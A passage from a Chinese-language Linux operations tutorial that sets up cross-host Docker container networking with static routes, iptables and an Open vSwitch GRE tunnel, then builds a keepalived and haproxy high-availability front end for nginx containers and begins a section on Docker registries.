Destination     Gateway         Genmask         Flags Metric Ref   Use Iface
0.0.0.0         192.168.100.1   0.0.0.0         UG    0      0        0 eth0
192.168.100.0   0.0.0.0         255.255.255.0   U     0      0        0 eth0
```

**第二个宿主机启动容器server2**

```
[root@ubuntu1804 ~]#docker run -it --name server2 --rm alpine sh
/ # ip a 
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
8: eth0@if9: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue 
state UP 
   link/ether 02:42:c0:a8:c8:02 brd ff:ff:ff:ff:ff:ff
   inet 192.168.200.2/24 brd 192.168.200.255 scope global eth0
       valid_lft forever preferred_lft forever
       
       
/ # route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref   Use Iface
0.0.0.0         192.168.200.1   0.0.0.0         UG    0      0        0 eth0
192.168.200.0   0.0.0.0         255.255.255.0   U     0      0        0 eth0
```

 **添加静态路由和iptables规则**

在各宿主机添加静态路由，网关指向对方宿主机的IP

**在第一台宿主机添加静态路由和iptables规则**

```
[root@ubuntu1804 ~]#route add -net 192.168.200.0/24 gw 10.0.0.102
[root@ubuntu1804 ~]#iptables -A FORWARD -s 10.0.0.0/24 -j ACCEPT
```

**在第二台宿主机添加静态路由和iptables规则**

```
[root@ubuntu1804 ~]#route add -net 192.168.100.0/24 gw 10.0.0.101
[root@ubuntu1804 ~]#iptables -A FORWARD -s 10.0.0.0/24 -j ACCEPT
```

**测试跨宿主机之间容器互联**

```
#宿主机A的容器server1访问宿主机B容器server2，同时在宿主机B上tcpdump抓包观察
/ # ping -c1 192.168.200.2
PING 192.168.200.2 (192.168.200.2): 56 data bytes
64 bytes from 192.168.200.2: seq=0 ttl=62 time=1.022 ms
--- 192.168.200.2 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max = 1.022/1.022/1.022 ms



#宿主机B的抓包可以观察到
[root@ubuntu1804 ~]#tcpdump -i eth0 -nn icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
16:57:37.912925 IP 10.0.0.101 > 192.168.200.2: ICMP echo request, id 2560, seq 
0, length 64
16:57:37.913208 IP 192.168.200.2 > 10.0.0.101: ICMP echo reply, id 2560, seq 0, 
length 64
```

**宿主机B的容器server2访问宿主机B容器server1，同时在宿主机A上tcpdump抓包观察**

```
/ # ping -c1 192.168.100.2
PING 192.168.100.2 (192.168.100.2): 56 data bytes
64 bytes from 192.168.100.2: seq=0 ttl=62 time=1.041 ms
--- 192.168.100.2 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max = 1.041/1.041/1.041 ms



#宿主机A的抓包可以观察到
[root@ubuntu1804 ~]#tcpdump -i eth0 -nn icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
16:59:11.775784 IP 10.0.0.102 > 192.168.100.2: ICMP echo request, id 2560, seq 
0, length 64
16:59:11.776113 IP 192.168.100.2 > 10.0.0.102: ICMP echo reply, id 2560, seq 0, 
length 64
```

###### 48.8.3.9.3 利用Open vSwitch实现跨主机的容器间互联(了解)

**Open vSwitch介绍**

```
Open vSwitch，即Open Virtual Switch开放虚拟交换机，简称OVS, 是在开源的Apache2.0许可下的产品级质量的多层虚拟交换机。由Nicira Networks开发，主要实现代码为可移植的C代码。它的目的是让大规模网络自动化可以通过编程扩展，同时仍然支持标准的管理接口和协议(例如NetFlow, sFlow, SPAN, RSPAN, CLI, LACP, 802.1ag) ,即Open vSwitch通过软件的方式实现了交换机功能。


跟传统的物理交换机相比，虚拟交换机同样具备众多优点，一是配置更加灵活。一台普通的服务器可以配置出数十台甚至上百台虚拟交换机，且端口数目可以灵活选择。例如，VMware的ESXi一台服务器可以仿真出248台虚拟交换机，且每台交换机预设虚拟端口即可达56个；二是成本更加低廉，通过虚拟交换往往可以获得昂贵的普通交换机才能达到的性能，例如微软的Hyper-V平台，虚拟机与虚拟交换机之间的联机速度轻易可达10Gbps。
官网: http://www.openvswitch.org/



缺点：现在一般生产中都用K8s进行跨宿主机的网络管理，此实验了解即可。。
```

**使用Open vSwitch实现跨主机容器连接一原理**

![1660236588324](linux体系.assets/1660236588324.png)

**什么是GRE隧道?**

```
GRE:通用路由协议封装
隧道技术(Tunneling) 是一种通过使用互联网络的基础设施在网络之间传递数据的方式。使用隧道传递的数据(或负载)可以是不同协议的数据帧或包。隧道协议将其它协议的数据帧或包重新封装然后通过隧道发送。新的帧头提供路由信息,以便通过互联网传递被封装的负载数据。
```

 **环境准备**

实现目标: 将两台主机的容器利用Open vSwitch连接起来，实现互联互通

| 主机名 |   操作系统   |   宿主机IP    |   Docker0 IP   |    容器 IP     |
| :----: | :----------: | :-----------: | :------------: | :------------: |
|  ovs1  | ubuntu 18.04 | 10.0.0.101/24 | 192.168.1.1/24 | 192.168.1.0/24 |
|  ovs2  | ubuntu 18.04 | 10.0.0.102/24 | 192.168.2.1/24 | 192.168.2.0/24 |

**修改两台主机的docker0分别使用不同的网段**

```
#配置第一台主机
[root@ovs1 ~]#vim /etc/docker/daemon.json 
{
  "bip": "192.168.1.1/24",
  "registry-mirrors": ["https://si7y70hh.mirror.aliyuncs.com"]
}


[root@ovs1 ~]#systemctl daemon-reload
[root@ovs1 ~]#systemctl restart docker
[root@ovs1 ~]#ip add show docker0
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state 
DOWN group default 
   link/ether 02:42:dc:29:03:6c brd ff:ff:ff:ff:ff:ff
   inet 192.168.1.1/24 brd 192.168.1.255 scope global docker0
       valid_lft forever preferred_lft forever
       
       
       
#配置第二台主机
[root@ovs2 ~]#vim /etc/docker/daemon.json
{
  "bip": "192.168.2.1/24",
  "registry-mirrors": ["https://si7y70hh.mirror.aliyuncs.com"]
}



[root@ovs1 ~]#systemctl daemon-reload
[root@ovs2 ~]#systemctl restart docker
[root@ovs2 ~]#ip add show docker0
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state 
DOWN group default 
   link/ether 02:42:e2:38:84:83 brd ff:ff:ff:ff:ff:ff
   inet 192.168.2.1/24 brd 192.168.2.255 scope global docker0
       valid_lft forever preferred_lft forever
```

**在两个宿主机安装openvswitch-switch和bridge-utils和确认版本**

```
#在第一个主机安装包
[root@ovs1 ~]#apt -y install openvswitch-switch bridge-utils
[root@ovs1 ~]#ps -e | grep ovs
  6766 ?        00:00:00 ovsdb-server
  6826 ?        00:00:00 ovs-vswitchd
  
  
#查看ovs版本信息和ovs支持的OpenFlow协议的版本
[root@ovs1 ~]#ovs-appctl --version
ovs-appctl (Open vSwitch) 2.9.5
[root@ovs1 ~]#ovs-ofctl --version
ovs-ofctl (Open vSwitch) 2.9.5
OpenFlow versions 0x1:0x5


#查看网桥
[root@ovs1 ~]#brctl show
bridge name bridge id STP enabled interfaces
docker0 8000.0242dc29036c no 


#在第二个主机安装包
[root@ovs2 ~]#apt -y install openvswitch-switch bridge-utils
[root@ovs2 ~]#ps -e | grep ovs
  6618 ?        00:00:00 ovsdb-server
  6680 ?        00:00:00 ovs-vswitchd
  
  
  
#查看ovs版本信息和ovs支持的OpenFlow协议的版本
[root@ovs2 ~]#ovs-appctl --version
ovs-appctl (Open vSwitch) 2.9.5
[root@ovs2 ~]#ovs-ofctl --version
ovs-ofctl (Open vSwitch) 2.9.5
OpenFlow versions 0x1:0x5


[root@ovs2 ~]#brctl show
bridge name   bridge id STP      enabled  interfaces
docker0       8000.0242e2388483  no
```

**在两个宿主机都创建obr0网桥并激活**

```
[root@ovs1 ~]#ovs-vsctl add-br obr0
[root@ovs1 ~]#ip link set dev obr0 up
[root@ovs1 ~]#ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group 
default qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
   inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP 
group default qlen 1000
   link/ether 00:0c:29:6b:54:d3 brd ff:ff:ff:ff:ff:ff
   inet 10.0.0.101/24 brd 10.0.0.255 scope global eth0
       valid_lft forever preferred_lft forever
   inet6 fe80::20c:29ff:fe6b:54d3/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state 
DOWN group default 
   link/ether 02:42:dc:29:03:6c brd ff:ff:ff:ff:ff:ff
   inet 192.168.1.1/24 brd 192.168.1.255 scope global docker0
       valid_lft forever preferred_lft forever
4: ovs-system: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group 
default qlen 1000
   link/ether ce:ff:6f:7f:4b:11 brd ff:ff:ff:ff:ff:ff
5: obr0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UNKNOWN 
group default qlen 1000
   link/ether f2:2b:d7:d8:a1:4d brd ff:ff:ff:ff:ff:ff
   inet6 fe80::f02b:d7ff:fed8:a14d/64 scope link 
       valid_lft forever preferred_lft forever
       
       
       
#第二台主机重复上面
[root@ovs2 ~]#ovs-vsctl add-br obr0
[root@ovs2 ~]#ip link set dev obr0 up
[root@ovs2 ~]#ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group 
default qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
   inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP 
group default qlen 1000
   link/ether 00:0c:29:01:f3:0c brd ff:ff:ff:ff:ff:ff
   inet 10.0.0.102/24 brd 10.0.0.255 scope global eth0
       valid_lft forever preferred_lft forever
   inet6 fe80::20c:29ff:fe01:f30c/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state 
DOWN group default 
   link/ether 02:42:e2:38:84:83 brd ff:ff:ff:ff:ff:ff
   inet 192.168.2.1/24 brd 192.168.2.255 scope global docker0
       valid_lft forever preferred_lft forever
4: ovs-system: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group 
default qlen 1000
   link/ether d6:29:ca:3a:9d:99 brd ff:ff:ff:ff:ff:ff
   5: obr0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UNKNOWN 
group default qlen 1000
   link/ether 82:4f:05:e3:5d:42 brd ff:ff:ff:ff:ff:ff
   inet6 fe80::804f:5ff:fee3:5d42/64 scope link 
       valid_lft forever preferred_lft forever
```

**在两个宿主机创建gre隧道(remote_ip为peer宿主机ip)**

```
#注意: 如果有多台docker主机需要构建网络创建多个gre隧道
#一条命令实现,remote_ip指向另一台宿主机的IP
[root@ovs1 ~]#ovs-vsctl add-port obr0 gre0 -- set Interface gre0 type=gre  options:remote_ip=10.0.0.102
#或者两条命令实现
[root@ovs1 ~]#ovs-vsctl add-port obr0 gre0 
[root@ovs1 ~]#ovs-vsctl set Interface gre0 type=gre options:remote_ip=10.0.0.102


[root@ovs1 ~]#ovs-vsctl list-ports obr0
gre0

[root@ovs1 ~]#ovs-vsctl show
84cbdad7-4731-4c2e-b7d7-eecb4a56d27b
   Bridge "obr0"
       Port "gre0"
           Interface "gre0"
               type: gre
               options: {remote_ip="10.0.0.102"}
       Port "obr0"
           Interface "obr0"
               type: internal
   ovs_version: "2.9.5"
    
[root@ovs1 ~]#ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group 
default qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
   inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP 
group default qlen 1000
   link/ether 00:0c:29:6b:54:d3 brd ff:ff:ff:ff:ff:ff
   inet 10.0.0.101/24 brd 10.0.0.255 scope global eth0
       valid_lft forever preferred_lft forever
   inet6 fe80::20c:29ff:fe6b:54d3/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state 
DOWN group default 
   link/ether 02:42:dc:29:03:6c brd ff:ff:ff:ff:ff:ff
   inet 192.168.1.1/24 brd 192.168.1.255 scope global docker0
       valid_lft forever preferred_lft forever
4: ovs-system: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group 
default qlen 1000
   link/ether ce:ff:6f:7f:4b:11 brd ff:ff:ff:ff:ff:ff
5: obr0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UNKNOWN 
group default qlen 1000
 link/ether f2:2b:d7:d8:a1:4d brd ff:ff:ff:ff:ff:ff
   inet6 fe80::f02b:d7ff:fed8:a14d/64 scope link 
       valid_lft forever preferred_lft forever
6: gre0@NONE: <NOARP> mtu 1476 qdisc noop state DOWN group default qlen 1000
   link/gre 0.0.0.0 brd 0.0.0.0
7: gretap0@NONE: <BROADCAST,MULTICAST> mtu 1462 qdisc noop state DOWN group 
default qlen 1000
   link/ether 00:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
8: erspan0@NONE: <BROADCAST,MULTICAST> mtu 1450 qdisc noop state DOWN group 
default qlen 1000
   link/ether 00:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
9: gre_sys@NONE: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 65000 qdisc fq_codel 
master ovs-system state UNKNOWN group default qlen 1000
   link/ether ce:d2:c1:4e:be:c6 brd ff:ff:ff:ff:ff:ff
   inet6 fe80::ccd2:c1ff:fe4e:bec6/64 scope link 
       valid_lft forever preferred_lft forever
       
       
       
#配置第二个宿主机
[root@ovs2 ~]#ovs-vsctl add-port obr0 gre0 -- set Interface gre0 type=gre  options:remote_ip=10.0.0.101
[root@ovs2 ~]#ovs-vsctl list-ports obr0
gre0
[root@ovs2 ~]#ovs-vsctl show
e6a3aab3-e224-4834-85fc-2516b33a67e2
   Bridge "obr0"
       Port "gre0"
           Interface "gre0"
               type: gre
               options: {remote_ip="10.0.0.101"}
       Port "obr0"
           Interface "obr0"
               type: internal
   ovs_version: "2.9.5"
    
    
[root@ovs2 ~]#ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group 
default qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
   inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP 
group default qlen 1000
   link/ether 00:0c:29:01:f3:0c brd ff:ff:ff:ff:ff:ff
   inet 10.0.0.102/24 brd 10.0.0.255 scope global eth0
       valid_lft forever preferred_lft forever
   inet6 fe80::20c:29ff:fe01:f30c/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state 
DOWN group default 
   link/ether 02:42:e2:38:84:83 brd ff:ff:ff:ff:ff:ff
   inet 192.168.2.1/24 brd 192.168.2.255 scope global docker0
       valid_lft forever preferred_lft forever
4: ovs-system: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group 
default qlen 1000
   link/ether d6:29:ca:3a:9d:99 brd ff:ff:ff:ff:ff:ff
   5: obr0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UNKNOWN 
group default qlen 1000
   link/ether 82:4f:05:e3:5d:42 brd ff:ff:ff:ff:ff:ff
   inet6 fe80::804f:5ff:fee3:5d42/64 scope link 
       valid_lft forever preferred_lft forever
6: gre0@NONE: <NOARP> mtu 1476 qdisc noop state DOWN group default qlen 1000
   link/gre 0.0.0.0 brd 0.0.0.0
7: gretap0@NONE: <BROADCAST,MULTICAST> mtu 1462 qdisc noop state DOWN group 
default qlen 1000
   link/ether 00:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
8: erspan0@NONE: <BROADCAST,MULTICAST> mtu 1450 qdisc noop state DOWN group 
default qlen 1000
   link/ether 00:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
10: gre_sys@NONE: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 65000 qdisc fq_codel 
master ovs-system state UNKNOWN group default qlen 1000
   link/ether 0a:98:48:d9:5f:83 brd ff:ff:ff:ff:ff:ff
   inet6 fe80::898:48ff:fed9:5f83/64 scope link 
       valid_lft forever preferred_lft forever
```

**在两个宿主机将obr0作为接口加入docker0网桥**

```
#第一台宿主机执行
[root@ovs1 ~]#brctl addif docker0 obr0
[root@ovs1 ~]#brctl show
bridge name bridge id STP enabled interfaces
docker0 8000.0242dc29036c no obr0


#第二台宿主机执行同样操作
[root@ovs2 ~]#brctl addif docker0 obr0
[root@ovs2 ~]#brctl show
bridge name bridge id STP enabled interfaces
docker0 8000.0242e2388483 no obr0
```

**在两个宿主机添加静态路由(网段地址为 peer Docker网段)** 

```
#ovs1 添加 peer docker net
[root@ovs1 ~]#ip route add 192.168.2.0/24 dev docker0  
[root@ovs1 ~]#route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref   Use Iface
0.0.0.0         10.0.0.2        0.0.0.0         UG    0      0        0 eth0
10.0.0.0        0.0.0.0         255.255.255.0   U     0      0        0 eth0
192.168.1.0      0.0.0.0         255.255.255.0   U     0      0        0 docker0
192.168.2.0      0.0.0.0         255.255.255.0   U     0      0        0 docker0


#ovs2 添加 peer docker net
[root@ovs2 ~]#ip route add 192.168.1.0/24 dev docker0  
[root@ovs2 ~]#route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref   Use Iface
0.0.0.0         10.0.0.2        0.0.0.0         UG    0      0        0 eth0
10.0.0.0        0.0.0.0         255.255.255.0   U     0      0        0 eth0
192.168.1.0      0.0.0.0         255.255.255.0   U     0      0        0 docker0
192.168.2.0      0.0.0.0         255.255.255.0   U     0      0        0 docker0
```

**在两个宿主机测试跨主机的容器之间的连通性**

```
[root@ovs1 ~]#docker run -it alpine /bin/sh
/ # ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: gre0@NONE: <NOARP> mtu 1476 qdisc noop state DOWN qlen 1000
   link/gre 0.0.0.0 brd 0.0.0.0
3: gretap0@NONE: <BROADCAST,MULTICAST> mtu 1462 qdisc noop state DOWN qlen 1000
   link/ether 00:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
4: erspan0@NONE: <BROADCAST,MULTICAST> mtu 1450 qdisc noop state DOWN qlen 1000
   link/ether 00:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
10: eth0@if11: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue 
state UP 
   link/ether 02:42:ac:11:01:02 brd ff:ff:ff:ff:ff:ff
   inet 192.168.1.2/24 brd 192.168.1.255 scope global eth0
       valid_lft forever preferred_lft forever
/ # ping -c 3 192.168.2.2
PING 192.168.2.2 (192.168.2.2): 56 data bytes
64 bytes from 192.168.2.2: seq=0 ttl=63 time=4.459 ms
64 bytes from 192.168.2.2: seq=1 ttl=63 time=1.279 ms
64 bytes from 192.168.2.2: seq=2 ttl=63 time=0.517 ms
--- 192.168.2.2 ping statistics ---
3 packets transmitted, 3 packets received, 0% packet loss
round-trip min/avg/max = 0.517/2.085/4.459 ms


[root@ovs2 ~]#docker run -it alpine /bin/sh
/ # ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: gre0@NONE: <NOARP> mtu 1476 qdisc noop state DOWN qlen 1000
   link/gre 0.0.0.0 brd 0.0.0.0
3: gretap0@NONE: <BROADCAST,MULTICAST> mtu 1462 qdisc noop state DOWN qlen 1000
   link/ether 00:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
4: erspan0@NONE: <BROADCAST,MULTICAST> mtu 1450 qdisc noop state DOWN qlen 1000
   link/ether 00:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
11: eth0@if12: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue 
state UP 
   link/ether 02:42:ac:11:02:02 brd ff:ff:ff:ff:ff:ff
   inet 192.168.2.2/24 brd 192.168.2.255 scope global eth0
       valid_lft forever preferred_lft forever
/ # ping -c 3 192.168.1.2 
PING 192.168.1.2 (192.168.1.2): 56 data bytes
64 bytes from 192.168.1.2: seq=0 ttl=63 time=1.553 ms
64 bytes from 192.168.1.2: seq=1 ttl=63 time=1.136 ms
64 bytes from 192.168.1.2: seq=2 ttl=63 time=1.176 ms
--- 192.168.1.2 ping statistics ---
3 packets transmitted, 3 packets received, 0% packet loss
round-trip min/avg/max = 1.136/1.288/1.553 ms
```

**在第二个主机上再打开一个nginx容器，从第一个主机的容器访问，观察来源的IP**

```
[root@ovs2 ~]#docker pull nginx
[root@ovs2 ~]#docker run -d --name nginx nginx
d3c26005a7626628f7baf017481217b36e3d69dabfa6cc86fe125f9548e7333c
[root@ovs2 ~]#docker exec -it nginx hostname -I
192.168.2.2 
[root@ovs2 ~]#docker logs -f nginx
192.168.1.2 - - [27/Feb/2020:09:57:18 +0000] "GET / HTTP/1.1" 200 612 "-" "Wget"
"-"



#从第一个主机的容器发起请求，可以查看到上面的访问日志输出
[root@ovs1 ~]#docker run -it alpine wget -qO - http://192.168.2.2/
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
   body {
       width: 35em;
       margin: 0 auto;
       font-family: Tahoma, Verdana, Arial, sans-serif;
   }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.</p>
<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at
<a href="http://nginx.com/">nginx.com</a>.</p>
<p><em>Thank you for using nginx.</em></p>
</body>
</html>
```

**在两个宿主机用脚本保存配置用于开机启动**

```
#ovs1配置
[root@ovs1 ~]#cat > net.sh <<EOF   
#!/bin/bash
ip link set dev obr0 up
brctl addif docker0 obr0
ip route add 192.168.2.0/24 dev docker0
EOF
[root@ovs1 ~]#chmod +x net.sh



#ovs2配置
[root@ovs2 ~]#cat > net.sh <<EOF  
#!/bin/bash
ip link set dev obr0 up
brctl addif docker0 obr0
ip route add 192.168.1.0/24 dev docker0
EOF
[root@ovs1 ~]#chmod +x net.sh
```

##### 48.8.3.10 利用docker结合负载实现网络架构高可用

###### 48.8.3.10.1 整体规划图

**下图为一个小型的网络架构图，其中nginx使用docker运行**

![1660238914540](linux体系.assets/1660238914540.png)

**环境准备**

|     主机名     |   操作系统   |     宿主机IP      |  Docker0 IP   |    容器    |
| :------------: | :----------: | :---------------: | :-----------: | :--------: |
| docker-server1 | ubuntu 18.04 | 192.168.10.205/24 | 172.17.0.1/16 | nginx-web1 |
| docker-server2 | ubuntu 18.04 | 192.168.10.206/24 | 172.17.0.1/16 | nginx-web2 |

###### 48.8.3.10.2 安装并配置keepalived

**Server1 安装并配置**

```
[root@docker-server1 ~]# yum install keepalived –y
[root@docker-server1 ~]# cat /etc/keepalived/keepalived.conf 
vrrp_instance MAKE_VIP_INT {
 state MASTER
 interface eth0
 virtual_router_id 1
 priority 100
 advert_int 1
 unicast_src_ip 192.168.10.205
 unicast_peer {
   192.168.10.206
 }
 
   authentication {
   auth_type PASS
   auth_pass 1111
 }
 
 
 virtual_ipaddress {
    192.168.10.100/24 dev eth0 label eth0:1
   }
}

[root@docker-server1~]# systemctl restart keepalived && systemctl enable keepalived
```

**Server2 安装并配置**

```
[root@docker-server2 ~]# yum install keepalived –y
[root@docker-server2 ~]# cat /etc/keepalived/keepalived.conf 
vrrp_instance MAKE_VIP_INT {
 state BACKUP
 interface eth0
 virtual_router_id 1
 priority 50
 advert_int 1
 unicast_src_ip 192.168.10.206
 unicast_peer {
    192.168.10.205
 }
 
 
 authentication {
   auth_type PASS
   auth_pass 1111
 }
 
 
 virtual_ipaddress {
    192.168.10.100/24 dev eth0 label eth0:1
  }
}

[root@docker-server2 ~]# systemctl restart keepalived && systemctl enable keepalived
```

###### 48.8.3.10.3 安装并配置haproxy

**修改系统内核使其可以监听本地不存在的IP**

```
[root@docker-server1 ~]# sysctl -w net.ipv4.ip_nonlocal_bind=1
[root@docker-server2 ~]# sysctl -w net.ipv4.ip_nonlocal_bind=1
```

**Server1安装并配置haproxy**

```
[root@docker-server1 ~]# yum install haproxy –y
[root@docker-server1 ~]# cat /etc/haproxy/haproxy.cfg 
global
maxconn 100000
uid 99
gid 99
daemon
nbproc 1
log 127.0.0.1 local0 info
defaults
option http-keep-alive
#option forwardfor
maxconn 100000
mode tcp
timeout connect 500000ms
timeout client 500000ms
timeout server 500000ms
listen stats
 mode http
 bind 0.0.0.0:9999
 stats enable
 log global
 stats uri   /haproxy-status
 stats auth haadmin:q1w2e3r4ys
 
 
#================================================================

frontend docker_nginx_web
 bind 192.168.10.100:80 
 mode http
 default_backend docker_nginx_hosts 
 
 
backend docker_nginx_hosts
 mode http
  #balance source
 balance roundrobin
 
 
server 192.168.10.205  192.168.10.205:81 check inter 2000 fall 3 rise 5
server 192.168.10.206  192.168.10.206:81 check inter 2000 fall 3 rise 5
```

**Server2安装并配置haproxy**

```
[root@docker-server2 ~]# yum install haproxy –y
[root@docker-server2 ~]# cat /etc/haproxy/haproxy.cfg 
global
maxconn 100000
uid 99
gid 99
daemon
nbproc 1
log 127.0.0.1 local0 info

defaults
option http-keep-alive

#option forwardfor
maxconn 100000
mode tcp
timeout connect 500000ms
timeout client 500000ms
timeout server 500000ms


listen stats
 mode http
 bind 0.0.0.0:9999
 stats enable
 log global
 stats uri   /haproxy-status
 stats auth haadmin:q1w2e3r4ys
 
#================================================================

frontend docker_nginx_web
 bind 192.168.10.100:80 
 mode http
 default_backend docker_nginx_hosts
 
 
backend docker_nginx_hosts
 mode http
  #balance source
 balance roundrobin
 

 server 192.168.10.205  192.168.10.205:81 check inter 2000 fall 3 rise 5
 server 192.168.10.206  192.168.10.206:81 check inter 2000 fall 3 rise 5
```

**各服务器别分启动haproxy**

```
[root@docker-server1 ~]# systemctl enable haproxy
Created symlink from /etc/systemd/system/multi-user.target.wants/haproxy.service to /usr/lib/systemd/system/haproxy.service.
[root@docker-server1 ~]# systemctl restart haproxy
[root@docker-server2 ~]# systemctl enable haproxy
Created symlink from /etc/systemd/system/multi-user.target.wants/haproxy.service to /usr/lib/systemd/system/haproxy.service.
[root@docker-server2 ~]# systemctl restart haproxy
```

###### 48.8.3.10.4 服务器启动nginx容器并验证

**Server1启动Nginx容器**

```
#从本地Nginx镜像启动一个容器，并指定端口，默认协议是tcp方式
[root@docker-server1 ~]# docker rm -f `docker ps -a -q` #先删除之前所有的容器
[root@docker-server1 ~]# docker run --name nginx-web1 -d -p 81:80 nginx-1.10.3:v1 nginx
5410e4042f731d2abe100519269f9241a7db2b3a188c6747b28423b5a584d020
```

**Server2启动nginx容器**

```
[root@docker-server2 ~]# rmc  #先删除之前所有的容器,rmc是别名
[root@docker-server2 ~]# docker run --name nginx-web1 -d -p 81:80 nginx-1.10.3:v1 nginx
84f2376242e38d7c8ba7fabf3134ac0610ab26358de0100b151df6a231a2b56a
```

**验证web访问**

![1660272118502](linux体系.assets/1660272118502.png)

**访问VIP**

![1660272144304](linux体系.assets/1660272144304.png)



### 48.9 Docker仓库

```
Docker仓库，类似于yum仓库，是用来保存镜像的仓库。为了方便的管理和使用docker镜像,可以将镜像集中保存至Docker仓库中，将制作好的镜像push到仓库集中保存，在需要镜像时，从仓库中pull镜像即可。

Docker仓库分为公有云仓库和私有云仓库
公有云仓库: 由互联网公司对外公开的仓库
1）官方
2）阿里云等第三方仓库
私有云仓库: 组织内部搭建的仓库，一般只为组织内部使用，常使用下面软件搭建仓库
1）docker registory
2）docker harbor

官方地址：https://hub.docker.com/
```

#### 48.9.1 官方docker仓库(了解)

##### 48.9.1.1 使用用户仓库管理镜像

###### 48.9.1.1.1 用户登录

上传镜像前需要执行docker login命令登录，登录后生成~/.docker/config.json文件保存验证信息

**格式：**

```
docker login [OPTIONS] [SERVER]
选项:  
-p, --password string   Password
    --password-stdin   Take the password from stdin
-u, --username string   Username
```

**范例:** 

```
#登录docker官方仓库方法1
[root@ubuntu1804 ~]#docker login -u paranoid1997 -pP@ssw0rd! docker.io
WARNING! Using --password via the CLI is insecure. Use --password-stdin.
WARNING! Your password will be stored unencrypted in /root/.docker/config.json.
Configure a credential helper to remove this warning. See
